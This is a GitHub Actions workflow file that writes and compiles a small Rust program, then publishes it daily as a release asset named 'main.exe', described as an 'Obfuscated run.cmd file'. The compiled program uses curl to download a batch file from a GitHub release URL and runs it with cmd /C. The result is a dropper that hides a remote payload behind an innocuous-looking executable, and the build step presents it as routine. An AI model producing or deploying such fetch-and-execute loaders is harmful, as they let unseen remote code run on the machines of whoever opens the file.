name: EXE

on:
  push:
    paths:
      - 'run.cmd'
  schedule:
    - cron: '0 0 * * *'  # Runs every day at midnight UTC
  workflow_dispatch:  # Allows manual triggering

permissions:
  contents: write
  pull-requests: write
  repository-projects: write

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v2

    - name: Setup Rust
      uses: actions-rs/toolchain@v1
      with:
        toolchain: stable
        target: x86_64-pc-windows-msvc
        profile: minimal

    - name: Create Rust file
      run: |
        echo use std::process::Command\; > script.rs
        echo fn main() \{ >> script.rs
        echo Command::new\(\"curl\"\) >> script.rs
        echo .arg\(\"-L\"\) >> script.rs
        echo .arg\(\"-o\"\) >> script.rs
        echo .arg\(\"download.bat\"\) >> script.rs
        echo .arg\(\"https://github.com/43a1723/test/releases/download/AutoBuild/download.bat\"\) >> script.rs
        echo .status\(\) >> script.rs
        echo .expect\(\"Failed to download file\"\)\; >> script.rs
        echo Command::new\(\"cmd\"\) >> script.rs
        echo .arg\(\"/C\"\) >> script.rs
        echo .arg\(\"download.bat\"\) >> script.rs
        echo .status\(\) >> script.rs
        echo .expect\(\"Failed to execute batch file\"\)\; >> script.rs
        echo \} >> script.rs

    - name: Compile Rust Script
      run: |
        rustc script.rs -o script.exe

    - name: Delete-tag-and-release
      uses: dev-drprasad/delete-tag-and-release@v1.1
      with:
        tag_name: AutoBuildExe
        delete_release: true
        github_token: ${{ secrets.GITHUB_TOKEN }}

    - name: Create Release
      id: create_release
      uses: actions/create-release@latest
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        tag_name: AutoBuildExe
        release_name: AutoBuildExe
        body: Obfuscated run.cmd file
        draft: false
        prerelease: false

    - name: Upload Release Asset
      id: upload-release-asset 
      uses: actions/upload-release-asset@v1
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        upload_url: ${{ steps.create_release.outputs.upload_url }}
        asset_path: script.exe
        asset_name: main.exe
        asset_content_type: application/octet-stream
